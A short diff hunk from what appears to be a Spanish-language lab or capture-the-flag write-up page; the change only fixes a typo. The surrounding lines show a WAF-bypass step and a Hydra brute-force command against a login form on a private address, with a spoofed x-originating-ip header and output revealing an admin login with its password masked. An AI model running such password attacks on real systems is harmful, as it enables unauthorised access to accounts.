@@ -72,7 +72,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <h3>Bypass WAF</h3>
 <pre class="pre"><code class="language-txt">https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c
 </code></pre>
-            <p>Atacando el formulario el login con Hydra.</p>
+            <p>Atacando el formulario de login con Hydra.</p>
 <pre class="pre"><code class="language-txt">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.11 http-post-form "/login.php:username=^USER^&password=^PASS^:H=x-originating-ip:1.2.3.4:F=Invalid username or password" -V -f -I
 [80][http-post-form] host: 192.168.1.11 login: admin password: s********
 </code></pre>
